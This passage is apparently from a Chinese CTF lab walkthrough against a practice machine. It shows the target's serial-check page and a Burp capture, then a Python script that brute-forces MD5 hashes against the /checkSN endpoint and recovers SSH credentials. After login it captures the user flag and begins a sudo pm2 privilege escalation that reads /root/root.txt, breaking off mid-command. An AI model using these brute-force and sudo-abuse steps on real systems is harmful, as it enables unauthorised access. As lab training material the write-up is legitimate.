    // console.log(<span class="pl-s"><span class="pl-pds">"</span>hashSN<span class="pl-pds">"</span></span>, hashSN)<span class="pl-k">;</span>
    <span class="pl-k">return</span> hashSN<span class="pl-k">;</span>
}

<span class="pl-c"><span class="pl-c">#</span>md5.min.js</span>
!function(n){"use strict";function d(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function f(n,t,r,e,o,u){return d((c=d(d(t,n),d(e,u)))&lt;&lt;(f=o)|c&gt;&gt;&gt;32-f,r);var c,f}function l(n,t,r,e,o,u,c){return f(t&amp;r|~t&amp;e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t&amp;e|r&amp;~e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function i(n,t){var r,e,o,u;n[t&gt;&gt;5]|=128&lt;&lt;t%32,n[14+(t+64&gt;&gt;&gt;9&lt;&lt;4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h&lt;n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=v(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=v(a,c,f,i,n[h+6],9,-1069501632),i=v(i,a,c,f,n[h+11],14,643717713),f=v(f,i,a,c,n[h],20,-373897302),c=v(c,f,i,a,n[h+5],5,-701558691),a=v(a,c,f,i,n[h+10],9,38016083),i=v(i,a,c,f,n[h+15],14,-660478335),f=v(f,i,a,c,n[h+4],20,-405537848),c=v(c,f,i,a,n[h+9],5,568446438),a=v(a,c,f,i,n[h+14],9,-1019803690),i=v(i,a,c,f,n[h+3],14,-187363961),f=v(f,i,a,c,n[h+8],20,1163531501),c=v(c,f,i,a,n[h+13],5,-1444681467),a=v(a,c,f,i,n[h+2],9,-51403784),i=v(i,a,c,f,n[h+7],14,1735328473),c=g(c,f=v(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=g(a,c,f,i,n[h+8],11,-2022574463),i=g(i,a,c,f,n[h+11],16,1839030562),f=g(f,i,a,c,n[h+14],23,-35309556),c=g(c,f,i,a,n[h+1],4,-1530992060),a=g(a,c,f,i,n[h+4],11,1272893353),i=g(i,a,c,f,n[h+7],16,-155497632),f=g(f,i,a,c,n[h+10],23,-1094730640),c=g(c,f,i,a,n[h+13],4,681279174),a=g(a,c,f,i,n[h],11,-358537222),i=g(i,a,c,f,n[h+3],16,-722521979),f=g(f,i,a,c,n[h+6],23,76029189),c=g(c,f,i,a,n[h+9],4,-640364487),a=g(a,c,f,i,n[h+12],11,-421815835),i=g(i,a,c,f,n[h+15],16,530742520),c=m(c,f=g(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function a(n){for(var t="",r=32*n.length,e=0;e&lt;r;e+=8)t+=String.fromCharCode(n[e&gt;&gt;5]&gt;&gt;&gt;e%32&amp;255);return t}function h(n){var t=[];for(t[(n.length&gt;&gt;2)-1]=void 0,e=0;e&lt;t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e&lt;r;e+=8)t[e&gt;&gt;5]|=(255&amp;n.charCodeAt(e/8))&lt;&lt;e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o&lt;n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t&gt;&gt;&gt;4&amp;15)+r.charAt(15&amp;t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return a(i(h(t=r(n)),8*t.length));var t}function u(n,t){return function(n,t){var r,e,o=h(n),u=[],c=[];for(u[15]=c[15]=void 0,16&lt;o.length&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(h(t)),512+8*t.length),a(i(c.concat(e),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&amp;&amp;define.amd?define(function(){return t}):"object"==typeof module&amp;&amp;module.exports?module.exports=t:n.md5=t}(this);
//<span class="pl-c"><span class="pl-c">#</span> sourceMappingURL=md5.min.js.map</span>

<span class="pl-c"><span class="pl-c">#</span>seedrandom.min.js</span>
!function(f,a,c){var s,l=256,p="random",d=c.pow(l,6),g=c.pow(2,52),y=2*g,h=l-1;function n(n,t,r){function e(){for(var n=u.g(6),t=d,r=0;n&lt;g;)n=(n+r)*l,t*=l,r=u.g(1);for(;y&lt;=n;)n/=2,t/=2,r&gt;&gt;&gt;=1;return(n+r)/t}var o=[],i=j(function n(t,r){var e,o=[],i=typeof t;if(r&amp;&amp;"object"==i)for(e in t)try{o.push(n(t[e],r-1))}catch(n){}return o.length?o:"string"==i?t:t+"\0"}((t=1==t?{entropy:!0}:t||{}).entropy?[n,S(a)]:null==n?function(){try{var n;return s&amp;&amp;(n=s.randomBytes)?n=n(l):(n=new Uint8Array(l),(f.crypto||f.msCrypto).getRandomValues(n)),S(n)}catch(n){var t=f.navigator,r=t&amp;&amp;t.plugins;return[+new Date,f,r,f.screen,S(a)]}}():n,3),o),u=new m(o);return e.int32=function(){return 0|u.g(4)},e.quick=function(){return u.g(4)/4294967296},e.double=e,j(S(u.S),a),(t.pass||r||function(n,t,r,e){return e&amp;&amp;(e.S&amp;&amp;v(e,u),n.state=function(){return v(u,{})}),r?(c[p]=n,t):n})(e,i,"global"in t?t.global:this==c,t.state)}function m(n){var t,r=n.length,u=this,e=0,o=u.i=u.j=0,i=u.S=[];for(r||(n=[r++]);e&lt;l;)i[e]=e++;for(e=0;e&lt;l;e++)i[e]=i[o=h&amp;o+n[e%r]+(t=i[e])],i[o]=t;(u.g=function(n){for(var t,r=0,e=u.i,o=u.j,i=u.S;n--;)t=i[e=h&amp;e+1],r=r*l+i[h&amp;(i[e]=i[o=h&amp;o+t])+(i[o]=t)];return u.i=e,u.j=o,r})(l)}function v(n,t){return t.i=n.i,t.j=n.j,t.S=n.S.slice(),t}function j(n,t){for(var r,e=n+"",o=0;o&lt;e.length;)t[h&amp;o]=h&amp;(r^=19*t[h&amp;o])+e.charCodeAt(o++);return S(t)}function S(n){return String.fromCharCode.apply(0,n)}if(j(c.random(),a),"object"==typeof module&amp;&amp;module.exports){module.exports=n;try{s=require("crypto")}catch(n){}}else"function"==typeof define&amp;&amp;define.amd?define(function(){return n}):c["seed"+p]=n}("undefined"!=typeof self?self:this,[],Math);

<span class="pl-c"><span class="pl-c">#</span>index.html</span>
<span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>html lang=<span class="pl-s"><span class="pl-pds">"</span>zh-CN<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>

<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
    <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>container<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
        <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>header<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>h1&gt;&lt;i class=<span class="pl-s"><span class="pl-pds">"</span>fas fa-key<span class="pl-pds">"</span></span>&gt;&lt;/i<span class="pl-k">&gt;</span> 序列号验证<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
            <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>subtitle<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>验证您的产品序列号<span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
        <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>

        <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>form-container<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>input-container<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>label class=<span class="pl-s"><span class="pl-pds">"</span>serial-label<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>序列号<span class="pl-k">&lt;</span>/label<span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> id=<span class="pl-s"><span class="pl-pds">"</span>sn-input<span class="pl-pds">"</span></span> class=<span class="pl-s"><span class="pl-pds">"</span>sn-input<span class="pl-pds">"</span></span> placeholder=<span class="pl-s"><span class="pl-pds">"</span>DPKU9-8APJ9-8XZJ0-8XZ08-7H111<span class="pl-pds">"</span></span>
                    maxlength=<span class="pl-s"><span class="pl-pds">"</span>29<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>format-hint<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>格式：XXXXX-XXXXX-XXXXX-XXXXX-XXXXX<span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>

            <span class="pl-k">&lt;</span>button id=<span class="pl-s"><span class="pl-pds">"</span>verify-btn<span class="pl-pds">"</span></span> class=<span class="pl-s"><span class="pl-pds">"</span>submit-btn<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>i class=<span class="pl-s"><span class="pl-pds">"</span>fas fa-check-circle<span class="pl-pds">"</span></span>&gt;&lt;/i<span class="pl-k">&gt;</span> 验证序列号
            <span class="pl-k">&lt;</span>/button<span class="pl-k">&gt;</span>
        <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>

        <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>response-container<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>div id=<span class="pl-s"><span class="pl-pds">"</span>status-icon<span class="pl-pds">"</span></span> class=<span class="pl-s"><span class="pl-pds">"</span>status-icon pending<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>i class=<span class="pl-s"><span class="pl-pds">"</span>fas fa-fingerprint<span class="pl-pds">"</span></span>&gt;&lt;/i<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>response-title<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>验证状态<span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>div id=<span class="pl-s"><span class="pl-pds">"</span>response-text<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>等待验证序列号...<span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
        <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>

        <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>instructions<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>p&gt;&lt;strong<span class="pl-k">&gt;</span>使用指南：<span class="pl-k">&lt;</span>/strong&gt;&lt;/p<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>ul<span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>li<span class="pl-k">&gt;</span>序列号格式为5组5个字符（字母和数字），每组用连字符分隔<span class="pl-k">&lt;</span>/li<span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>li<span class="pl-k">&gt;</span>输入时系统会自动添加连字符<span class="pl-k">&lt;</span>/li<span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>li<span class="pl-k">&gt;</span>示例：<span class="pl-k">&lt;</span>code<span class="pl-k">&gt;</span>DPKU9-8APJ9-8XZJ0-8XZ08-7H<span class="pl-k">111&lt;</span>/code&gt;&lt;/li<span class="pl-k">&gt;</span>
                <span class="pl-k">&lt;</span>li<span class="pl-k">&gt;</span>点击<span class="pl-s"><span class="pl-pds">"</span>验证序列号<span class="pl-pds">"</span></span>按钮或按<span class="pl-k">&lt;</span>kbd class=<span class="pl-s"><span class="pl-pds">"</span>keyboard-shortcut<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Enter<span class="pl-k">&lt;</span>/kbd<span class="pl-k">&gt;</span>提交验证<span class="pl-k">&lt;</span>/li<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>/ul<span class="pl-k">&gt;</span>
        <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>

        <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>footer<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
            © 2026 大傻子序列号验证系统 <span class="pl-k">|</span> 安全可靠
        <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
    <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
    <span class="pl-k">&lt;</span>script src=<span class="pl-s"><span class="pl-pds">"</span>js/md5.min.js<span class="pl-pds">"</span></span>&gt;&lt;/script<span class="pl-k">&gt;</span>
    <span class="pl-k">&lt;</span>script src=<span class="pl-s"><span class="pl-pds">"</span>/js/index.js<span class="pl-pds">"</span></span>&gt;&lt;/script<span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>

<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span>
完善python脚本，测试序列号为：DPKU9-8APJ9-8XZJ0-8XZ08-7H111，burp抓包如下：
POST /checkSN HTTP/1.1
Host: 192.168.31.127:8080
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0<span class="pl-k">;</span> Win64<span class="pl-k">;</span> x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Content-Type: application/json
Accept: <span class="pl-k">*</span>/<span class="pl-k">*</span>
Origin: http://192.168.31.127:8080
Referer: http://192.168.31.127:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh<span class="pl-k">;</span>q=0.9
Connection: close

{<span class="pl-s"><span class="pl-pds">"</span>sn<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>fff6b1d8405256ad9176e19bf2779969<span class="pl-pds">"</span></span>}</pre></div>
<p>编写的 <code class="notranslate">python</code>脚本如下</p>
<h5><code class="notranslate"> 爆破hash</code></h5>
<div class="highlight highlight-source-shell"><pre class="notranslate">import requests
import hashlib
import sys
import <span class="pl-k">time</span>

<span class="pl-c"><span class="pl-c">#</span> 目标URL和已知信息</span>
TARGET_URL = <span class="pl-s"><span class="pl-pds">"</span>http://192.168.31.127:8080/checkSN<span class="pl-pds">"</span></span>  <span class="pl-c"><span class="pl-c">#</span> 根据抓包信息设置目标URL</span>
KNOWN_HASH = <span class="pl-s"><span class="pl-pds">"</span>fff6b1d8405256ad9176e19bf2779969<span class="pl-pds">"</span></span>  <span class="pl-c"><span class="pl-c">#</span> 测试序列号的已知hash</span>
KEY = <span class="pl-s"><span class="pl-pds">"</span>6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC<span class="pl-pds">"</span></span>
VI = <span class="pl-s"><span class="pl-pds">"</span>Jkdsfojweflk0024564555*<span class="pl-pds">"</span></span>


def calculate_hashsn(c1, c2, c3, c4, c5):
    <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span>计算5个字符组合的MD5值<span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
    combined = c1 + c2 + c3 + c4 + c5
    <span class="pl-k">return</span> <span class="pl-en">hashlib.md5(combined.encode()).hexdigest</span>()


def <span class="pl-en">verify_test_combination</span>():
    <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span>验证测试序列号的组合是否有效<span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
    print(<span class="pl-s"><span class="pl-pds">"</span>[*] 验证测试序列号组合...<span class="pl-pds">"</span></span>)
    <span class="pl-c"><span class="pl-c">#</span> 测试序列号的5字符组合（需要逆向推导）</span>
    test_combinations = [
        (<span class="pl-s"><span class="pl-pds">'</span>6<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>K<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>+<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>3<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>J<span class="pl-pds">'</span></span>),
        (<span class="pl-s"><span class="pl-pds">'</span>6<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>K<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>+<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>3<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>k<span class="pl-pds">'</span></span>),
        (<span class="pl-s"><span class="pl-pds">'</span>6<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>K<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>+<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>3<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>d<span class="pl-pds">'</span></span>)
    ]

    <span class="pl-k">for</span> <span class="pl-smi">i, combo</span> <span class="pl-k">in</span> enumerate(test_combinations):
        c1, c2, c3, c4, c5 = combo
        hashsn = calculate_hashsn(c1, c2, c3, c4, c5)

        <span class="pl-k">if</span> hashsn == KNOWN_HASH:
            print(f<span class="pl-s"><span class="pl-pds">"</span>[+] 测试序列号组合验证成功: {combo} -&gt; {hashsn}<span class="pl-pds">"</span></span>)
            <span class="pl-k">return</span> combo

    print(<span class="pl-s"><span class="pl-pds">"</span>[-] 未找到匹配的测试序列号组合<span class="pl-pds">"</span></span>)
    <span class="pl-k">return</span> None


def <span class="pl-en">brute_force_sn</span>():
    <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span>爆破所有可能的字符组合<span class="pl-pds">"</span><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
    total_combinations = 12 <span class="pl-k">*</span> 9 <span class="pl-k">*</span> 8 <span class="pl-k">*</span> 7 <span class="pl-k">*</span> 6
    count = 0
    start_time = <span class="pl-en">time.time</span>()
    found_test = False
    test_combo = None

    print(<span class="pl-s"><span class="pl-pds">"</span>[*] 开始爆破序列号验证凭证...<span class="pl-pds">"</span></span>)
    print(f<span class="pl-s"><span class="pl-pds">"</span>[*] 总组合数: {total_combinations}<span class="pl-pds">"</span></span>)

    <span class="pl-c"><span class="pl-c">#</span> 枚举所有可能的字符组合</span>
    <span class="pl-k">for</span> <span class="pl-smi">c1</span> <span class="pl-k">in</span> KEY[:12]:
        <span class="pl-k">for</span> <span class="pl-smi">c2</span> <span class="pl-k">in</span> KEY[:9]:
            <span class="pl-k">for</span> <span class="pl-smi">c3</span> <span class="pl-k">in</span> KEY[:8]:
                <span class="pl-k">for</span> <span class="pl-smi">c4</span> <span class="pl-k">in</span> KEY[:7]:
                    <span class="pl-k">for</span> <span class="pl-smi">c5</span> <span class="pl-k">in</span> VI[:6]:
                        count += 1
                        combo = (c1, c2, c3, c4, c5)
                        hashsn = calculate_hashsn(<span class="pl-k">*</span>combo)

                        <span class="pl-c"><span class="pl-c">#</span> 检查是否匹配测试序列号</span>
                        <span class="pl-k">if</span> not found_test and hashsn == KNOWN_HASH:
                            print(f<span class="pl-s"><span class="pl-pds">"</span>\n[+] 找到测试序列号组合: {combo}<span class="pl-pds">"</span></span>)
                            test_combo = combo
                            found_test = True

                        <span class="pl-c"><span class="pl-c">#</span> 发送验证请求</span>
                        payload = {<span class="pl-s"><span class="pl-pds">"</span>sn<span class="pl-pds">"</span></span>: hashsn}
                        try:
                            response = requests.post(TARGET_URL, json=payload, timeout=5)
                            <span class="pl-k">if</span> response.status_code == 200:
                                data = <span class="pl-en">response.json</span>()
                                <span class="pl-k">if</span> data.get(<span class="pl-s"><span class="pl-pds">'</span>code<span class="pl-pds">'</span></span>) == 200:
                                    elapsed = <span class="pl-en">time.time</span>() - start_time
                                    print(f<span class="pl-s"><span class="pl-pds">"</span>\n\n[+] 爆破成功! 用时: {elapsed:.2f}秒<span class="pl-pds">"</span></span>)
                                    print(f<span class="pl-s"><span class="pl-pds">"</span>[+] 有效组合: {c1}{c2}{c3}{c4}{c5}<span class="pl-pds">"</span></span>)
                                    print(f<span class="pl-s"><span class="pl-pds">"</span>[+] 凭证hash: {hashsn}<span class="pl-pds">"</span></span>)
                                    print(f<span class="pl-s"><span class="pl-pds">"</span>[+] 服务器响应: {data.get('data', '')}<span class="pl-pds">"</span></span>)
                                    <span class="pl-k">return</span>
                        except (requests.RequestException, requests.Timeout):
                            <span class="pl-k">continue</span>

                        <span class="pl-c"><span class="pl-c">#</span> 进度显示</span>
                        <span class="pl-k">if</span> count % 100 == 0 or count == total_combinations:
                            elapsed = <span class="pl-en">time.time</span>() - start_time
                            rate = count / elapsed <span class="pl-k">if</span> elapsed <span class="pl-k">&gt;</span> 0 <span class="pl-k">else</span> 0
                            percent = (count / total_combinations) <span class="pl-k">*</span> 100
                            remaining = (total_combinations - count) / rate <span class="pl-k">if</span> rate <span class="pl-k">&gt;</span> 0 <span class="pl-k">else</span> 0

                            sys.stdout.write(
                                f<span class="pl-s"><span class="pl-pds">"</span>\r进度: {percent:.2f}% | <span class="pl-pds">"</span></span>
                                f<span class="pl-s"><span class="pl-pds">"</span>已完成: {count}/{total_combinations} | <span class="pl-pds">"</span></span>
                                f<span class="pl-s"><span class="pl-pds">"</span>速度: {rate:.1f}组合/秒 | <span class="pl-pds">"</span></span>
                                f<span class="pl-s"><span class="pl-pds">"</span>预计剩余: {remaining:.1f}秒<span class="pl-pds">"</span></span>
                            )
                            <span class="pl-en">sys.stdout.flush</span>()

    print(<span class="pl-s"><span class="pl-pds">"</span>\n\n[-] 爆破完成，未找到有效凭证<span class="pl-pds">"</span></span>)
    <span class="pl-k">if</span> found_test:
        print(f<span class="pl-s"><span class="pl-pds">"</span>[+] 测试序列号组合存在: {test_combo}<span class="pl-pds">"</span></span>)
    else:
        print(<span class="pl-s"><span class="pl-pds">"</span>[-] 未找到测试序列号组合<span class="pl-pds">"</span></span>)


<span class="pl-k">if</span> __name__ == <span class="pl-s"><span class="pl-pds">"</span>__main__<span class="pl-pds">"</span></span>:
    <span class="pl-c"><span class="pl-c">#</span> 首先验证测试序列号组合</span>
    test_combo = <span class="pl-en">verify_test_combination</span>()

    <span class="pl-c"><span class="pl-c">#</span> 执行爆破</span>
    <span class="pl-en">brute_force_sn</span>()

    print(<span class="pl-s"><span class="pl-pds">"</span>\n[*] 脚本执行结束<span class="pl-pds">"</span></span>)</pre></div>
<p>很快就有运行结果</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">[<span class="pl-k">*</span>] 验证测试序列号组合...
[-] 未找到匹配的测试序列号组合
[<span class="pl-k">*</span>] 开始爆破序列号验证凭证...
[<span class="pl-k">*</span>] 总组合数: 36288
进度: 2.76% <span class="pl-k">|</span> 已完成: 1000/36288 <span class="pl-k">|</span> 速度: 72.9组合/秒 <span class="pl-k">|</span> 预计剩余: 483.9秒

[+] 爆破成功<span class="pl-k">!</span> 用时: 14.13秒
[+] 有效组合: 6365d
[+] 凭证hash: ee5a82db0f9bf1c1903821477e11c067
[+] 服务器响应: welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111

[<span class="pl-k">*</span>] 脚本执行结束</pre></div>
<p>拿到<code class="notranslate">ssh</code>的账号密码信息<code class="notranslate">welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111</code>，好熟悉的密码，就是页面序列号的示例</p>
<h3>5.获得<code class="notranslate">welcome</code>权限</h3>
<p>测试直接用<code class="notranslate">welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111</code>成功<code class="notranslate">ssh</code>登陆靶机</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111</span>
└─<span class="pl-c"><span class="pl-c">#</span> ssh welcome@192.168.31.127</span>
welcome@192.168.31.127<span class="pl-s"><span class="pl-pds">'</span>s password:#welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111</span>
<span class="pl-s">=============================</span>
<span class="pl-s">Welcome!!!</span>
<span class="pl-s">QQ Group:660930334</span>
<span class="pl-s">=============================</span>
<span class="pl-s">lingdong:~$ id</span>
<span class="pl-s">uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</span>
<span class="pl-s">lingdong:~$ cd</span>
<span class="pl-s">lingdong:~$ ls</span>
<span class="pl-s">user.txt</span>
<span class="pl-s"></span></pre></div>
<h5>拿到<code class="notranslate">user.txt</code></h5>
<pre class="notranslate"><code class="notranslate">lingdong:~$ cat user.txt
flag{user-afc8b494c5ba167971f10274f5a81534}
lingdong:~$
</code></pre>
<h3>6.获得<code class="notranslate">root</code>权限</h3>
<p><code class="notranslate">sudo</code>发现所有用户能够以 <code class="notranslate">root </code>身份运行 <code class="notranslate">/root/.local/share/pnpm/global-bin/pm2</code>和<code class="notranslate">/usr/bin/pnpm</code></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">lingdong:/tmp$ sudo -l
Matching Defaults entries <span class="pl-k">for</span> welcome on lingdong:
    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin

Runas and Command-specific defaults <span class="pl-k">for</span> welcome:
    Defaults<span class="pl-k">!</span>/usr/sbin/visudo env_keep+=<span class="pl-s"><span class="pl-pds">"</span>SUDO_EDITOR EDITOR VISUAL<span class="pl-pds">"</span></span>

User welcome may run the following commands on lingdong:
    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /root/.local/share/pnpm/global-bin/pm2
    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/bin/pnpm</pre></div>
<p>先<code class="notranslate">-h</code>看看使用说明，两个都可以提权</p>
<h5>方法1：<code class="notranslate">pm2</code>提权</h5>
<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> tldr pm2</span>
Node.js 的进程管理工具。
用于日志管理、监控和配置进程。
更多信息：https://pm2.keymetrics.io.
<span class="pl-c"><span class="pl-c">#</span>pm2 start app.js --name 应用名称</span>
 - 启动一个进程并指定名称，以便后续操作使用：
<span class="pl-c"><span class="pl-c">#</span>pm2 list</span>
 - 列出所有进程：
<span class="pl-c"><span class="pl-c">#</span>pm2 delete|del &lt;名称|ID|命名空间|脚本|all|json|stdin...&gt;</span>
 - 停止并从 PM2 进程列表中删除进程
<span class="pl-c"><span class="pl-c">#</span>pm2 --interpreter &lt;解释器&gt;</span>
 - 设置执行应用的解释器（默认：node）
<span class="pl-c"><span class="pl-c">#</span>pm2 start [选项] [名称|命名空间|文件|环境|ID...]</span>
 - 启动并守护应用
......</pre></div>
<p>直接通过 <code class="notranslate">PM2</code> 的<code class="notranslate">start</code>参数执行命令,先直接读<code class="notranslate">root.txt</code>文件</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">lingdong:/tmp$ <span class="pl-c"><span class="pl-c">#</span> 创建读取脚本</span>
lingdong:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>#!/bin/sh</span>
<span class="pl-s">&gt; cat /root/root.txt &gt; /tmp/root_content 2&gt;&amp;1</span>
